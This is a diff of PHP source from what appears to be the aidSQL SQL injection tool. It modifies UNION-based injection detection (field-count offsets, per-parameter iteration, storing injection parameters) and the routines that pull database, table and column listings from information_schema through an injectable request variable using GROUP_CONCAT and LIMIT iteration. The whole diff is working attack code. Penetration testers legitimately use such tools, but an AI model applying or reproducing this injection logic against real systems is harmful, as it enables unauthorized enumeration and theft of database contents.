@@ -13,7 +13,6 @@
 			private	$_fields							=	array();
 			private	$_vulnerableIndex				=	0;
 			private	$_fieldWrapping				=	NULL;
-			private	$_injection						=	NULL;
 			private	$_groupConcatLength			=	NULL;
 
 
@@ -62,7 +61,14 @@
 					)
 				);
 
-				$this->detectUnionInjection($sqliParams,"unionQuery","CONCAT($hexOpen,%value%,$hexClose)");
+
+				if(array_key_exists("start-offset",$this->_config)){
+
+					$offset	=	((int)$this->_config["start-offset"])	?	$this->_config["start-offset"]	:	1;
+
+				}
+
+				$this->detectUnionInjection($sqliParams,"unionQuery","CONCAT($hexOpen,%value%,$hexClose)",$offset);
 
 				if(sizeof($this->_injection)){
 
@@ -130,7 +136,7 @@
 
 			}
 
-			private function detectUnionInjection(Array $sqliParams,$callback=NULL,$wrapping=NULL,$value=NULL){
+			private function detectUnionInjection(Array $sqliParams,$callback=NULL,$wrapping=NULL,$offset=1,$value=NULL){
 
 				$this->checkUnionInjectionParameters($sqliParams);
 
@@ -138,9 +144,21 @@
 
 				foreach($requestVariables as $requestVariable=>$requestVariableValue){
 
+					if($this->isIgnoredRequestVariable($requestVariable,$requestVariableValue)){
+						continue;
+					}
+
 					$iterationContainer	=	array();
 
-					for($maxFields=1;$maxFields<=$this->_injectionAttempts;$maxFields++){
+					if($offset>1){
+
+						for($i=0;$i<$offset;$i++){
+							$iterationContainer[]	=	$offset;
+						}
+
+					}
+
+					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){
 
 						$iterationContainer[]	=	(!empty($value))	?	$value	:	$maxFields;
 
@@ -186,11 +204,18 @@
 
 										if($result){
 
-											$this->_injection	=	array(
+											foreach($requestVariables as $key=>$rV){
+												if($key == $requestVariable){
+													unset($requestVariables[$key]);
+												}
+											}
+
+											$injectionParameters	=	array(
 																				"index"				=>	$maxFields,	
 																				"fieldValues"		=>	$iterationContainer,
 																				"requestVariable"	=>	$requestVariable,
 																				"requestValue"		=>	$madeUpValue,
+																				"requestVariables"=> $requestVariables,
 																				"wrapping"			=>	$wrapping,
 																				"payload"			=>	$payLoad,		//constant
 																				"limit"				=>	$limit,			//variable 
@@ -198,6 +223,8 @@
 																				"comment"			=>	$comment,		//constant
 																				"callback"			=>	$callback
 											);
+
+											$this->setInjectionParameters($injectionParameters);
 
 											$this->_payload	=	$payLoad;
 
@@ -227,7 +254,7 @@
 
 			private function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){
 
-				$params			=	&$this->_injection;
+				$params	=	&$this->_injection;
 
 				foreach($params["fieldValues"] as &$val){
 					$val	=	$value;	
@@ -253,8 +280,10 @@
 					$this->_queryBuilder->orderBy($params["order"]["by"],$params["order"]["sort"]);
 				}
 
-				if(is_array($params["limit"])&&sizeof($params["limit"])){
-					$this->_queryBuilder->limit($params["limit"]);
+				if(isset($params["limit"])){
+					if(is_array($params["limit"])&&sizeof($params["limit"])){
+						$this->_queryBuilder->limit($params["limit"]);
+					}
 				}
 
 				$sql		=	$this->_queryBuilder->getSQL();
@@ -310,16 +339,20 @@
 			//Hopefully we can count the registers and do a limit iteration	
 			//through that :)
 
-			private function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array(),$count=NULL){
+			public function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array(),$count=NULL){
 
 				if(is_null($count)){
 
 					$count	=	$this->unionQuery("COUNT($value)",$from,$where,$group);
 					$count	=	$count[0];
+					$this->log("GOT REGISTRY COUNT = $count",0,"light_cyan");
 
 				}
 
-				$restoreLimit	=	$this->_injection["limit"];
+				if(isset($this->_injection["limit"])){
+					$restoreLimit	=	$this->_injection["limit"];
+				}
+
 				$results			=	array();
 
 				for($i=0;$i<=$count;$i++){
@@ -330,8 +363,9 @@
 
 				}
 
-
-				$this->_injection["limit"]	=	$restoreLimit;
+				if(isset($this->_injection["limit"])&&isset($restoreLimit)){
+					$this->_injection["limit"]	=	$restoreLimit;
+				}
 
 				return $results;
 
@@ -412,6 +446,7 @@
 
 					$this->log("FOUND DATABASE $database",0,"light_purple");
 
+
 					if(isset($ommitSchemas)){
 
 						if(in_array($database,$ommitSchemas)){
@@ -421,17 +456,14 @@
 
 					}
 
-					$dbSchema	=	$this->getSingleSchema($database);
+					$dbSchema	=	$this->getSingleSchema($database,$version,$user);
 
 					if(!$dbSchema){
 
 						$this->log("WARNING: Couldnt fetch database schema!",2,"yellow");
-						return FALSE;
 
 					}
 
-					$dbSchema->setDbUser($user);
-					$dbSchema->setDbVersion($version);
 					$this->addSchema($dbSchema);
 
 
@@ -439,34 +471,30 @@
 
 			}
 
-			public function getSingleSchema($database){
+			public function getSingleSchema($database,$version,$user){
 
 				$groupConcatLength	=	$this->getGroupConcatLength();
 
 				$dbSchema				=	new \aidSQL\core\DatabaseSchema();
 
 				$dbSchema->setDbName($database);
+				$dbSchema->setDbUser($user);
+				$dbSchema->setDbVersion($version);
 	
-				$separator	=	",0x3f";
-
-				$select	=	"TABLE_NAME,0x7c,TABLE_TYPE,0x7c,ENGINE,0x7c,TABLE_COLLATION,0x7c,IF(AUTO_INCREMENT,1,0)".$separator;
+				$select	=	"TABLE_NAME,0x7c,TABLE_TYPE,0x7c,ENGINE,0x7c,TABLE_COLLATION,0x7c,IF(AUTO_INCREMENT,1,0)";
 				$from		=	"information_schema.tables";
+
 				$where	=	array("table_schema=".\String::hexEncode($database));
 
 				$tables	=	$this->unionQuery("GROUP_CONCAT($select)",$from,$where);
 				$tables	=	$tables[0];
-
-				if(!$tables){
-
-					return FALSE;
-
-				}
+				
 			
-				if($this->detectTruncatedData($tables)){
+				if($this->detectTruncatedData($tables)||!$tables){
 
 					$count	=	$this->unionQuery("COUNT(TABLE_NAME)",$from,$where);	
 					$count	=	$count[0]-1;
-					$select	=	substr($select,0,(strlen($separator)*-1));
+					//$select	=	substr($select,0,(strlen($separator)*-1));
 					$tables	=	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);
 
 				}else{
@@ -529,7 +557,7 @@
 
 				$this->log("Fetching table \"$table\" columns ...",0,"white");
 
-				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,IF(COLUMN_KEY,COLUMN_KEY,0),0x7c,IF(EXTRA,EXTRA,0),0x7c,PRIVILEGES".$separator;
+				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,IF(COLUMN_KEY,COLUMN_KEY,0),0x7c,IF(EXTRA,EXTRA,0),0x7c,PRIVILEGES";
 				$from								=	"information_schema.columns";
 
 				$where							=	array(
@@ -538,27 +566,23 @@
 																	"table_name=".\String::hexEncode($table)
 														);
 
-				$columns =	$this->unionQuery("GROUP_CONCAT($select)",$from,$where);	
-				$columns	=	$columns[0];
-
-				if(!$columns){
-					return FALSE;
-				}
+				$columns		=	$this->unionQuery("GROUP_CONCAT($select SEPARATOR 0x25)",$from,$where);	
+				$columns		=	$columns[0];
 
 				$retColumns	=	array();
 
-				if($this->detectTruncatedData($columns)){
+				if($this->detectTruncatedData($columns)||!$columns){
 
 					$count	=	$this->unionQuery("COUNT(COLUMN_NAME)",$from,$where);	
 					$count	=	$count[0];
 
-					$select	=	substr($select,0,(strlen($separator)*-1));
+					//$select	=	substr($select,0,(strlen($separator)*-1));
 					$columns =	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);
 
 
 				}else{
 
-					$columns		=	explode('?',$columns);
+					$columns		=	explode('%',$columns);
 					
 				}
 
